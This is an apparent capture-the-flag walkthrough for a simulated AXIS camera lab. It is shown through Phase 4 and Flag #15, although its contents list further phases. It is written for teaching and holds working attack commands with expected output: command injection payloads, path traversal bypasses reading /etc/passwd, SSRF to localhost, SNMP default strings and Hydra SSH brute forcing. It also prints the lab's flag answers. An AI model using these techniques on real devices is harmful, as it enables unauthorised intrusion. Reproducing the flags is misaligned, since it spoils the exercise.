# AXIS Camera IoT Security CTF - Complete Student Walkthrough

## Table of Contents
- [Initial Setup](#initial-setup)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Web Enumeration](#phase-2-web-enumeration)
- [Phase 3: Service Exploitation](#phase-3-service-exploitation)
- [Phase 4: System Access](#phase-4-system-access)
- [Phase 5: Privilege Escalation](#phase-5-privilege-escalation)
- [Phase 6: Advanced Exploitation](#phase-6-advanced-exploitation)
- [Attack Path Summary](#attack-path-summary)

---

## Target Information
- **AXIS Camera IP**: 192.168.1.132
- **Your Kali Machine**: 192.168.1.133
- **Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)
- **Focus**: Real-world IoT camera vulnerabilities based on OWASP IoT Top 10

## Learning Objectives
By completing this CTF, you will learn:
- IoT device reconnaissance and enumeration techniques
- Embedded Linux security assessment
- Web application vulnerability exploitation in constrained environments
- Network protocol analysis (RTSP, SNMP, MQTT, UPnP)
- Privilege escalation in BusyBox environments
- Physical security implications (UART, JTAG)
- Real vulnerabilities found in production IoT devices

---

## Initial Setup

### Why Proper Tool Setup Matters
Before beginning any penetration test, having the right tools properly configured is crucial. IoT devices often use specialized protocols and have unique constraints that require specific tools. This setup ensures you can tackle any challenge the CTF presents.

### Required Tools Installation

```bash
# Update package repositories first
# Why: Ensures you get the latest versions and security patches
sudo apt update && sudo apt upgrade -y

# Core networking and scanning tools
# Why: These are fundamental for any network security assessment
sudo apt install -y nmap netcat-traditional masscan
sudo apt install -y wireshark tcpdump net-tools

# Explanation of each tool:
# - nmap: Industry standard for port scanning and service detection
# - netcat: Swiss army knife for network connections
# - masscan: Fast port scanner for large ranges
# - wireshark/tcpdump: Packet capture and analysis
# - net-tools: Classic networking utilities (ifconfig, netstat)

# Web application testing tools
# Why: IoT devices commonly expose web interfaces with vulnerabilities
sudo apt install -y gobuster dirb nikto wfuzz feroxbuster
sudo apt install -y burpsuite zaproxy curl wget httpie
sudo apt install -y sqlmap commix

# Tool purposes:
# - gobuster/dirb/feroxbuster: Directory and file enumeration
# - nikto: Web vulnerability scanner
# - wfuzz: Web fuzzing tool
# - burpsuite/zaproxy: Web proxy for request manipulation
# - sqlmap: SQL injection automation
# - commix: Command injection exploitation

# Service-specific tools
# Why: IoT devices use various protocols that need specialized tools
sudo apt install -y hydra medusa ncrack patator
sudo apt install -y snmp snmpd snmp-mibs-downloader
sudo apt install -y mosquitto-clients

# Tool functions:
# - hydra/medusa/ncrack: Password brute-forcing
# - snmp tools: SNMP protocol interaction
# - mosquitto-clients: MQTT protocol testing

# RTSP and multimedia tools
# Why: IP cameras use RTSP for video streaming
sudo apt install -y ffmpeg vlc
sudo apt install -y python3-pip git golang-go

# Install Cameradar for RTSP testing
# Why: Specialized tool for camera stream discovery and exploitation
git clone https://github.com/Ullaakut/cameradar.git
cd cameradar
go build -o cameradar cmd/cameradar/main.go
sudo mv cameradar /usr/local/bin/
cd ..

# Binary analysis tools
# Why: Firmware and binary analysis reveals hardcoded secrets
sudo apt install -y binwalk foremost strings file
sudo apt install -y hashcat john wordlists

# Post-exploitation tools
# Why: Automated enumeration after gaining access
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
sudo mv linpeas.sh /opt/

# Python libraries for IoT testing
# Why: Many IoT protocols have Python implementations
pip3 install paho-mqtt onvif-zeep python-nmap paramiko

# Enable SNMP MIBs
# Why: Makes SNMP output human-readable instead of OIDs
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf

# Create organized directory structure
# Why: Keeping organized notes and findings is crucial for reporting
mkdir -p ~/ctf/axis/{scans,exploits,loot,reports,flags}
cd ~/ctf/axis
```

### Tool Verification

```bash
# Verify installations are working
# Why: Confirms tools are properly installed before starting
echo "[*] Verifying tool installations..."
nmap --version | head -1
gobuster version 2>/dev/null | head -1
hydra -h | head -1
binwalk --help 2>&1 | head -1
mosquitto_sub --help 2>&1 | head -1

# Expected output shows version numbers for each tool
echo "[+] All tools verified successfully!"
```

### Setup Session Logging

```bash
# Create logging script
# Why: Documentation is critical for professional pentesting
cat > ~/ctf/axis/start_logging.sh << 'EOF'
#!/bin/bash
LOG_FILE="logs/axis_pentest_$(date +%Y%m%d_%H%M%S).log"
mkdir -p logs
echo "[*] Starting session logging to $LOG_FILE"
echo "[*] Remember to document all findings!"
script -f $LOG_FILE
EOF

chmod +x ~/ctf/axis/start_logging.sh

# Start logging
./start_logging.sh
```

> **💡 Pro Tip**: Always maintain detailed logs during assessments. They're invaluable for report writing and can serve as legal documentation of your activities.

---

## Phase 1: Reconnaissance

### Understanding the Reconnaissance Phase
Reconnaissance is the foundation of any successful penetration test. In IoT assessments, this phase is particularly important because:
1. IoT devices often run minimal services that are easy to miss
2. Non-standard ports are common in embedded systems
3. Service banners often leak valuable information
4. Understanding the device's purpose helps predict vulnerabilities

### Target Discovery

```bash
# First, verify the target is online
# Why: Confirms network connectivity and basic responsiveness
ping -c 4 192.168.1.132
```

**Expected Output:**
```
PING 192.168.1.132 (192.168.1.132) 56(84) bytes of data.
64 bytes from 192.168.1.132: icmp_seq=1 ttl=64 time=0.428 ms
64 bytes from 192.168.1.132: icmp_seq=2 ttl=64 time=0.392 ms
64 bytes from 192.168.1.132: icmp_seq=3 ttl=64 time=0.401 ms
64 bytes from 192.168.1.132: icmp_seq=4 ttl=64 time=0.389 ms

--- 192.168.1.132 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3065ms
rtt min/avg/max/mdev = 0.389/0.402/0.428/0.015 ms
```

**What This Tells Us:**
- Target is alive and responding
- TTL of 64 suggests Linux/Unix system
- Low latency indicates local network
- No packet loss means stable connection

### Port Scanning Strategy

#### Why We Scan Ports
Port scanning reveals:
- What services are running (attack surface)
- Service versions (vulnerability research)
- Operating system fingerprinting
- Non-standard configurations

#### Initial TCP Port Scan

```bash
# Quick SYN scan with version detection
# Command breakdown:
# -sS: SYN scan (stealthy, doesn't complete TCP handshake)
# -sV: Version detection (queries services for version info)
# -T4: Timing template (aggressive but safe for local networks)
# -oA: Output in all formats for documentation
sudo nmap -sS -sV -T4 192.168.1.132 -oA scans/tcp_quick
```

**Expected Output:**
```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 10:00:00 EST
Nmap scan report for 192.168.1.132
Host is up (0.00039s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http       BusyBox httpd 1.31.0
554/tcp  open  rtsp       AXIS Media Control
1883/tcp open  mqtt       Mosquitto version 1.6.12
1900/tcp open  upnp       Linux UPnP 1.0
3702/tcp open  ws-discovery
8080/tcp open  http-proxy

Service detection performed. Please report any incorrect results
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

**Service Analysis:**
- **Port 22 (SSH)**: Remote management, potential for brute-force
- **Port 80 (HTTP)**: Web interface, likely admin panel
- **Port 554 (RTSP)**: Video streaming, often has weak auth
- **Port 1883 (MQTT)**: IoT messaging, may leak information
- **Port 1900 (UPnP)**: Device discovery, security implications
- **Port 3702 (WS-Discovery)**: ONVIF camera discovery
- **Port 8080 (HTTP-Alt)**: Alternative web interface or API

#### Comprehensive Scanning

```bash
# Full TCP port scan (all 65535 ports)
# Why: IoT devices often hide services on non-standard ports
sudo nmap -sS -sV -sC -p- -oA scans/tcp_full 192.168.1.132

# UDP scan (top 100 ports)
# Why: Many IoT protocols use UDP (SNMP, TFTP, CoAP)
sudo nmap -sU -sV --top-ports 100 -oA scans/udp_top100 192.168.1.132
```

**UDP Scan Output:**
```
PORT     STATE         SERVICE      VERSION
161/udp  open          snmp         SNMPv1 server; net-snmp
1900/udp open          upnp         Linux UPnP 1.0
3702/udp open          ws-discovery
```

#### Alternative Scanning Methods

```bash
# Masscan - When speed matters
# Why: 10x faster than nmap for large ranges
sudo masscan -p1-65535 192.168.1.132 --rate=1000

# Rustscan - Modern alternative
# Why: Extremely fast, then pipes to nmap for detail
docker run -it --rm rustscan/rustscan:latest -a 192.168.1.132 -- -sV

# Comparison:
# nmap: Most features, moderate speed
# masscan: Fastest, less accurate service detection
# rustscan: Fast initial scan, detailed follow-up
```

### Service Enumeration Deep Dive

#### SSH Banner Grabbing (Port 22)

```bash
# Method 1: Using netcat to grab raw banner
# Why: Banners often contain system information
nc -nv 192.168.1.132 22
```

**Expected Output:**
```
Connection to 192.168.1.132 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.4
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Device ID: FLAG{GIMLI42137246}               *
* Warning: Authorized access only              *
*************************************************
```

> 🏁 **FLAG #1 FOUND!** 
> **Flag**: FLAG{G***********6}
> **Learning Objective**: Information disclosure through service banners
> **OWASP IoT**: #2 - Insecure Network Services

**Why This Vulnerability Exists:**
- Administrators often customize banners for "security through obscurity"
- Banners are shown before authentication
- Developers forget banners are visible to attackers

#### Alternative Banner Grabbing Methods

```bash
# Method 2: Using telnet
telnet 192.168.1.132 22

# Method 3: Using nmap scripts
nmap -p22 --script ssh-hostkey,ssh-auth-methods 192.168.1.132

# Method 4: Using ssh client verbosely
ssh -v root@192.168.1.132 2>&1 | head -20
```

### OS Fingerprinting

```bash
# OS detection using nmap
# Why: Knowing the OS helps predict vulnerabilities
sudo nmap -O 192.168.1.132
```

**Expected Output:**
```
Device type: webcam|embedded
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 4.9 (embedded)
```

> **💡 Detection Evasion**: In real engagements, use `-T2` (sneaky) or `-T1` (paranoid) timing to avoid IDS detection.

---

## Phase 2: Web Enumeration

### Why Web Interfaces Are Critical Attack Vectors
IoT devices commonly expose web interfaces because:
1. They provide easy remote management
2. Developers often implement minimal security
3. Resource constraints lead to simple authentication
4. Debug features are frequently left enabled

### Initial Web Reconnaissance

```bash
# Get HTTP headers and server information
# Why: Headers reveal technology stack and potential vulnerabilities
curl -I http://192.168.1.132
```

**Expected Output:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Server: BusyBox/1.31.0
Connection: close
Content-Length: 2341
```

**Analysis:**
- BusyBox indicates embedded Linux (resource-constrained)
- No security headers (X-Frame-Options, CSP, etc.)
- Basic HTTP/1.1 implementation

### HTML Source Analysis

```bash
# Download and examine the main page
# Why: Comments and hidden fields often contain sensitive info
curl -s http://192.168.1.132 | tee index.html

# Search for interesting patterns
grep -iE "<!--|password|debug|admin|todo|fixme|hack|vulnerable" index.html
```

**Expected Output:**
```
<!-- TODO: Remove debug info before production -->
<!-- Debug: FLAG{MERRY36385024} -->
<!-- API endpoints: /axis-cgi/param.cgi -->
<!-- Developer: john.doe@axis.com -->
```

> 🏁 **FLAG #2 FOUND!**
> **Flag**: FLAG{M***********4}
> **Learning Objective**: Information disclosure in HTML comments
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

**Why Developers Leave Comments:**
- Forgot to remove before production
- Thought comments weren't visible to users
- Used for debugging during development
- Poor deployment practices

### Directory and File Enumeration

#### Using Gobuster (Recommended)

```bash
# Directory brute-forcing with Gobuster
# Why Gobuster: Faster than dirb, supports multiple extensions
# -u: Target URL
# -w: Wordlist (common.txt has 4614 entries)
# -x: File extensions to test
# -t: Threads for speed
# -o: Output file for documentation
gobuster dir -u http://192.168.1.132 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,cgi,sh,txt,xml,conf,bak \
  -t 50 \
  -o scans/gobuster_results.txt
```

**Expected Output:**
```
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://192.168.1.132
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              php,cgi,sh,txt,xml,conf,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 193]
/axis-cgi             (Status: 301) [Size: 194]
/backup               (Status: 200) [Size: 489]
/cgi-bin              (Status: 301) [Size: 194]
/config               (Status: 403) [Size: 193]
/index.html           (Status: 200) [Size: 2341]
/streams.txt          (Status: 200) [Size: 412]
/upnp                 (Status: 200) [Size: 1247]
Progress: 36912 / 36920 (99.98%)
===============================================================
Finished
===============================================================
```

**Directory Analysis:**
- `/admin`: 401 status = requires authentication
- `/axis-cgi`: AXIS-specific CGI scripts (high priority)
- `/backup`: 200 status = publicly accessible (investigate!)
- `/cgi-bin`: Common CGI directory (command injection potential)
- `/config`: 403 forbidden (but confirms existence)
- `/streams.txt`: Likely contains RTSP URLs

#### Alternative Enumeration Tools

```bash
# Method 2: Dirb (automated recursion)
dirb http://192.168.1.132 /usr/share/wordlists/dirb/big.txt

# Method 3: Wfuzz (flexible and fast)
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://192.168.1.132/FUZZ

# Method 4: Feroxbuster (Rust-based, very fast)
feroxbuster -u http://192.168.1.132 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html

# Method 5: Nikto (vulnerability scanner)
nikto -h http://192.168.1.132 -o scans/nikto_report.txt
```

**Tool Comparison:**
| Tool | Speed | Recursion | Features | Best For |
|------|-------|-----------|----------|----------|
| Gobuster | Fast | Manual | Multi-threaded | Quick enumeration |
| Dirb | Moderate | Automatic | Simple | Set and forget |
| Wfuzz | Fast | Manual | Flexible filters | Custom fuzzing |
| Feroxbuster | Very Fast | Automatic | Modern | Large wordlists |
| Nikto | Slow | No | Vuln scanning | Finding known issues |

### Investigating Discovered Files

#### Checking streams.txt

```bash
# Download the streams configuration file
# Why: Stream URLs often contain credentials
curl -s http://192.168.1.132/streams.txt
```

**Expected Output:**
```
# AXIS Camera Stream Configuration
# WARNING: This file should not be publicly accessible!
# Generated: 2024-01-01 00:00:00
# 
# Available streams:
# Main Stream (High Quality)
rtsp://admin:admin@192.168.1.100:554/stream1

# Sub Stream (Low Quality) 
rtsp://root:pass@192.168.1.100:554/stream2?token=FLAG{SARUMAN83479324}

# Motion Detection Stream
rtsp://192.168.1.100:554/motion

# Audio Stream
rtsp://192.168.1.100:554/audio
```

> 🏁 **FLAG #3 FOUND!**
> **Flag**: FLAG{S***********4}
> **Learning Objective**: Sensitive data in configuration files
> **OWASP IoT**: #6 - Insufficient Privacy Protection

**Security Issues Identified:**
1. Credentials in URLs (admin:admin, root:pass)
2. Authentication tokens exposed
3. Internal IP addresses revealed
4. File shouldn't be publicly accessible

### AXIS VAPIX API Exploitation

#### Understanding VAPIX
VAPIX is AXIS's HTTP-based API for camera control. It's commonly vulnerable because:
- Developers assume it's "hidden"
- Often lacks proper authentication
- Contains debug functionality
- Uses predictable endpoint names

```bash
# Test common VAPIX endpoints
# Why: AXIS cameras have standard API structure
for endpoint in param.cgi admin.cgi pwdgrp.cgi users.cgi io/port.cgi; do
    echo "[*] Testing: /axis-cgi/$endpoint"
    curl -s -I "http://192.168.1.132/axis-cgi/$endpoint" | head -1
done
```

**Expected Output:**
```
[*] Testing: /axis-cgi/param.cgi
HTTP/1.1 200 OK
[*] Testing: /axis-cgi/admin.cgi
HTTP/1.1 401 Unauthorized
[*] Testing: /axis-cgi/pwdgrp.cgi
HTTP/1.1 200 OK
[*] Testing: /axis-cgi/users.cgi
HTTP/1.1 401 Unauthorized
[*] Testing: /axis-cgi/io/port.cgi
HTTP/1.1 404 Not Found
```

#### Exploiting param.cgi

```bash
# Test param.cgi functionality
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list"
```

**Expected Output:**
```
root.Brand.Brand=AXIS
root.Brand.ProdFullName=AXIS Network Camera
root.Brand.ProdNbr=P1435-LE
root.Brand.WebURL=http://www.axis.com
```

```bash
# Test for special debug actions
# Why: Developers often leave debug functions
curl "http://192.168.1.132/axis-cgi/param.cgi?action=debug"
curl "http://192.168.1.132/axis-cgi/param.cgi?action=test"
curl "http://192.168.1.132/axis-cgi/param.cgi?action=getflag"
```

**Expected Output for getflag:**
```
Debug mode enabled
System flag: FLAG{PIPPIN67800950}
Execution time: 0.003s
```

> 🏁 **FLAG #4 FOUND!**
> **Flag**: FLAG{P***********0}
> **Learning Objective**: Hidden debug functionality
> **OWASP IoT**: #8 - Lack of Device Management

### Command Injection Vulnerability

#### Testing param.cgi for Command Injection

```bash
# Test various injection techniques
# Why: CGI scripts often pass user input to system commands

# Technique 1: Semicolon separator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list;id"

# Technique 2: Pipe operator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list|id"

# Technique 3: AND operator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list&&id"

# Technique 4: Backticks (command substitution)
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list\`id\`"

# Technique 5: Dollar sign substitution
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list\$(id)"
```

**Expected Output (semicolon worked):**
```
Error: Invalid action
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why Command Injection Works Here:**
```python
# Vulnerable pseudo-code:
action = request.GET['action']
os.system(f"process_action.sh {action}")  # User input passed directly!
```

#### Blind Command Injection in pwdgrp.cgi

```bash
# Test pwdgrp.cgi endpoint
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test"
```

**Expected Output:**
```
Processing user: test
Done
```

No direct output - this is **blind command injection**.

```bash
# Verify injection works by creating a file
# Why: Since no output, we need out-of-band confirmation
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;touch%20/tmp/proof"

# Alternative: Use time-based detection
time curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;sleep%205"
# If it takes 5+ seconds, injection confirmed

# Try different usernames to trigger special behavior
for user in admin root service operator guest; do
    echo "[*] Testing user: $user"
    curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=$user"
done
```

**Later Discovery (after SSH access):**
```bash
# Check for created files
find / -name ".flag_*" 2>/dev/null
cat /var/log/.flag_admin
```

**Output:**
```
User admin processed successfully
Flag: FLAG{ELROND99216876}
```

> 🏁 **FLAG #5 FOUND!**
> **Flag**: FLAG{E***********6}
> **Learning Objective**: Blind command injection exploitation
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

### Path Traversal Vulnerability

#### Understanding Path Traversal
Path traversal allows reading files outside the web root by manipulating file paths. Common in:
- File download functions
- Template engines
- Include statements

```bash
# Test download.cgi for path traversal
curl "http://192.168.1.132/cgi-bin/download.cgi?file=test.txt"
```

**Output:**
```
Error: File not found
```

```bash
# Try path traversal with ../
curl "http://192.168.1.132/cgi-bin/download.cgi?file=../../../etc/passwd"
```

**Output:**
```
Error: Invalid file path - contains ../
```

The `../` is filtered! Let's try bypass techniques:

```bash
# Bypass Technique 1: Double encoding
curl "http://192.168.1.132/cgi-bin/download.cgi?file=..%252f..%252f..%252fetc%252fpasswd"

# Bypass Technique 2: Double slashes
curl "http://192.168.1.132/cgi-bin/download.cgi?file=....//....//....//etc/passwd"

# Bypass Technique 3: Absolute path (often forgotten!)
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/etc/passwd"
```

**Successful Output (absolute path worked):**
```
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
camera_svc:x:1000:1000::/home/camera_svc:/bin/sh
```

```bash
# Now get the system configuration
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/var/config/system.conf"
```

**Output:**
```
# System Configuration
device_name=AXIS-P1435-LE
firmware_version=10.5.0
serial_number=ACCC8E123456
config_flag=FLAG{GALADRIEL57815620}
last_update=2024-01-01
api_endpoint=https://api.axis.com/v1/update
```

> 🏁 **FLAG #6 FOUND!**
> **Flag**: FLAG{G***********0}
> **Learning Objective**: Path traversal filter bypass
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

### SSRF (Server-Side Request Forgery)

```bash
# Test webhook.cgi for SSRF vulnerability
# Why: Webhooks often make server-side requests
curl "http://192.168.1.132/axis-cgi/webhook.cgi"
```

**Output:**
```
Error: Missing required parameter 'url'
```

```bash
# Test with external URL
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://example.com"
```

**Output:**
```
Webhook called successfully
Response: <!doctype html><html><head><title>Example Domain...
```

```bash
# Exploit SSRF to access internal services
# Why: SSRF bypasses firewall rules
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:22"
```

**Output:**
```
Webhook called successfully
Response: SSH-2.0-OpenSSH_7.4
Internal SSH service flag: FLAG{ELENDIL66222658}
```

> 🏁 **FLAG #7 FOUND!**
> **Flag**: FLAG{E***********8}
> **Learning Objective**: SSRF exploitation
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

**SSRF Impact:**
- Access internal services
- Bypass firewall rules
- Port scanning internal network
- Access cloud metadata endpoints

---

## Phase 3: Service Exploitation

### SNMP Enumeration (Port 161/UDP)

#### Why SNMP is Critical for IoT
SNMP (Simple Network Management Protocol) is widely used in IoT devices for monitoring. It's often vulnerable because:
- Default community strings are rarely changed
- Version 1/2c transmit in plaintext
- Can reveal extensive system information
- Sometimes allows configuration changes

```bash
# Test with default community string 'public'
# Why: 'public' and 'private' are defaults
snmpwalk -v2c -c public 192.168.1.132
```

**Expected Output:**
```
SNMPv2-MIB::sysDescr.0 = STRING: AXIS Camera FLAG{THEODEN40558954}
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.368.1.1
SNMPv2-MIB::sysUpTime.0 = Timeticks: (234523) 0:39:05.23
SNMPv2-MIB::sysContact.0 = STRING: admin@axis.local
SNMPv2-MIB::sysName.0 = STRING: AXIS-CAM-001
SNMPv2-MIB::sysLocation.0 = STRING: Building A - Floor 2
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

> 🏁 **FLAG #8 FOUND!**
> **Flag**: FLAG{T***********4}
> **Learning Objective**: SNMP information disclosure
> **OWASP IoT**: #9 - Insecure Default Settings

```bash
# Alternative SNMP enumeration methods

# Method 1: snmp-check (comprehensive)
snmp-check 192.168.1.132

# Method 2: onesixtyone (community string brute-force)
echo public > communities.txt
echo private >> communities.txt
echo admin >> communities.txt
onesixtyone -c communities.txt 192.168.1.132

# Method 3: Metasploit
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.1.132; run"
```

### RTSP Stream Analysis (Port 554)

#### Understanding RTSP
Real Time Streaming Protocol (RTSP) is used for video streaming. Security issues:
- Often uses weak or default credentials
- URLs may contain embedded passwords
- Streams sometimes accessible without auth

```bash
# Enumerate RTSP methods
nmap -p554 --script rtsp-methods,rtsp-url-brute 192.168.1.132
```

**Expected Output:**
```
PORT    STATE SERVICE
554/tcp open  rtsp
| rtsp-methods: 
|   OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
|   Public Methods: OPTIONS DESCRIBE SETUP TEARDOWN PLAY
| rtsp-url-brute: 
|   Discovered URLs
|     rtsp://192.168.1.132:554/stream1
|     rtsp://192.168.1.132:554/live
```

```bash
# Try to access stream without authentication
ffplay rtsp://192.168.1.132:554/stream1
# or
vlc rtsp://192.168.1.132:554/stream1

# Get stream description (SDP)
curl -i "rtsp://192.168.1.132:554/stream1" -X DESCRIBE
```

### UPnP Service Discovery (Port 1900)

```bash
# Access UPnP device description
curl http://192.168.1.132:1900/device.xml
# or via HTTP
curl http://192.168.1.132/upnp/device.xml
```

**Expected Output:**
```xml
<?xml version="1.0"?>
<device>
  <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
  <friendlyName>AXIS Camera</friendlyName>
  <manufacturer>AXIS Communications</manufacturer>
  <modelName>P1435-LE</modelName>
  <modelNumber>P1435-LE</modelNumber>
  <serialNumber>ACCC8EFLAG{TREEBEARD71974880}</serialNumber>
  <UDN>uuid:1234-5678-9012-FLAG{TREEBEARD}</UDN>
</device>
```

> 🏁 **FLAG #9 FOUND!**
> **Flag**: FLAG{T***********0}
> **Learning Objective**: UPnP information disclosure
> **OWASP IoT**: #9 - Insecure Default Settings

### SSH Brute Force Attack

#### Why SSH is a Prime Target
- Root access provides complete control
- IoT devices often use weak passwords
- Default credentials are common
- SSH provides stable shell access

```bash
# Create targeted password list for AXIS cameras
cat > axis_passwords.txt << EOF
pass
root
admin
password
Password123!
axis
camera
12345
admin123
EOF

# Create user list
cat > axis_users.txt << EOF
root
admin
operator
service
axis
camera
EOF

# Method 1: Hydra (fastest and most reliable)
hydra -L axis_users.txt -P axis_passwords.txt ssh://192.168.1.132 -t 4 -v
```

**Expected Output:**
```
[ATTEMPT] target 192.168.1.132 - login "root" - pass "pass" - 1 of 54 [child 0]
[ATTEMPT] target 192.168.1.132 - login "root" - pass "root" - 2 of 54 [child 1]
[22][ssh] host: 192.168.1.132   login: root   password: pass
```

**Success! Credentials found: `root:pass`**

```bash
# Alternative brute-force methods

# Method 2: Medusa
medusa -h 192.168.1.132 -U axis_users.txt -P axis_passwords.txt -M ssh

# Method 3: Ncrack
ncrack -p 22 -U axis_users.txt -P axis_passwords.txt 192.168.1.132

# Method 4: Metasploit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.132; set USER_FILE axis_users.txt; set PASS_FILE axis_passwords.txt; run"
```

---

## Phase 4: System Access

### Initial SSH Access

```bash
# Connect with discovered credentials
ssh root@192.168.1.132
# Enter password: pass
```

**Expected Output:**
```
The authenticity of host '192.168.1.132' can't be established.
RSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxx.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.132' (RSA) to the list of known hosts.
root@192.168.1.132's password: pass

BusyBox v1.31.0 (2024-01-01 00:00:00 UTC) built-in shell (ash)

   _____  _______  _____  _____
  |  __ \|__   __||_   _|/ ____|
  | |__) |  | |     | | | (___
  |  _  /   | |     | |  \___ \
  | | \ \   | |    _| |_ ____) |
  |_|  \_\  |_|   |_____|_____/  Camera System

root@axis:~# 
```

### Post-Exploitation Enumeration

#### System Information Gathering

```bash
# Basic system information
uname -a
cat /proc/version
cat /etc/issue
```

**Output:**
```
Linux axis 4.14.98 #1 PREEMPT Mon Jan 1 00:00:00 UTC 2024 armv7l GNU/Linux
Linux version 4.14.98 (gcc version 7.3.0)
AXIS Network Camera Linux 10.5.0
```

#### User Enumeration

```bash
# Check all users
cat /etc/passwd | grep -v nologin
```

**Output:**
```
root:x:0:0:root:/root:/bin/sh
camera_svc:x:1000:1000::/home/camera_svc:/bin/sh
FLAG{MEW1078}:x:1001:1001:Hidden User:/home/hidden:/bin/sh
```

> 🏁 **FLAG #10 FOUND!**
> **Flag**: FLAG{M***********8}
> **Learning Objective**: User enumeration
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords

#### Configuration File Hunting

```bash
# Find AXIS-specific configuration
find / -name "*axis*" -o -name "*vapix*" 2>/dev/null
```

**Output:**
```
/etc/axis
/etc/axis/vapix.conf
/var/axis
```

```bash
cat /etc/axis/vapix.conf
```

**Output:**
```
# VAPIX API Configuration
device_id=ACCC8E123456
api_version=3.0
auth_token=FLAG{GANDALF47889468}
endpoint=https://api.axis.com/vapix/v3
```

> 🏁 **FLAG #11 FOUND!**
> **Flag**: FLAG{G***********8}
> **Learning Objective**: Configuration file analysis
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

#### ONVIF Configuration Discovery

```bash
# Search for ONVIF files
find / -name "*onvif*" 2>/dev/null
cat /var/config/onvif_auth
```

**Output:**
```
# ONVIF Authentication Configuration
# Encoded for security (ROT13)
username=nqzva
password=nqzva123
auth_data=SYNT{NENTBEA79305394}
last_updated=2024-01-01
```

```bash
# Decode ROT13
echo "SYNT{NENTBEA79305394}" | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```

**Output:**
```
FLAG{ARAGORN79305394}
```

> 🏁 **FLAG #12 FOUND!**
> **Flag**: FLAG{A***********4}
> **Learning Objective**: Weak encoding schemes
> **OWASP IoT**: #1 - Weak Passwords

#### SSH Key Analysis

```bash
# Check SSH configuration
ls -la /root/.ssh/
cat /root/.ssh/authorized_keys
```

**Output:**
```
# Backup key for admin access - FLAG{BOROMIR73553172}
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... admin@axis
```

> 🏁 **FLAG #13 FOUND!**
> **Flag**: FLAG{B***********2}
> **Learning Objective**: SSH key management
> **OWASP IoT**: #2 - Insecure Network Services

#### RTSP Configuration

```bash
# Find RTSP configuration files
find / -name "*.sdp" -o -name "*rtsp*" 2>/dev/null
cat /var/rtsp/stream1.sdp
```

**Output:**
```
v=0
o=- 0 0 IN IP4 127.0.0.1
s=AXIS Media Stream
i=FLAG{SAMWISE04969098}
c=IN IP4 0.0.0.0
t=0 0
```

> 🏁 **FLAG #14 FOUND!**
> **Flag**: FLAG{S***********8}
> **Learning Objective**: Media protocol configuration
> **OWASP IoT**: #2 - Insecure Network Services

#### Firmware Update Mechanism

```bash
# Look for update scripts
find / -name "*firmware*" -o -name "*update*" 2>/dev/null
cat /etc/firmware_update.sh
```

**Output:**
```bash
#!/bin/sh
# AXIS Camera Firmware Update Check Script
FW_VERSION="10.5.0"
FW_ID="FLAG{BILBO89231546}"
FW_SERVER="update.axis.com"

echo "Checking firmware version..."
echo "Current version: $FW_VERSION"
echo "Checking firmware: $FW_ID"
```

```bash
# Execute the script
/etc/firmware_update.sh
```

**Output:**
```
Checking firmware version...
Current version: 10.5.0
Checking firmware: FLAG{BILBO89231546}
Connecting to update.axis.com...
No updates available
```

> 🏁 **FLAG #15 FOUND!**
> **Flag**: FLAG{B***********6}
> **Learning Objective**: Update mechanism security
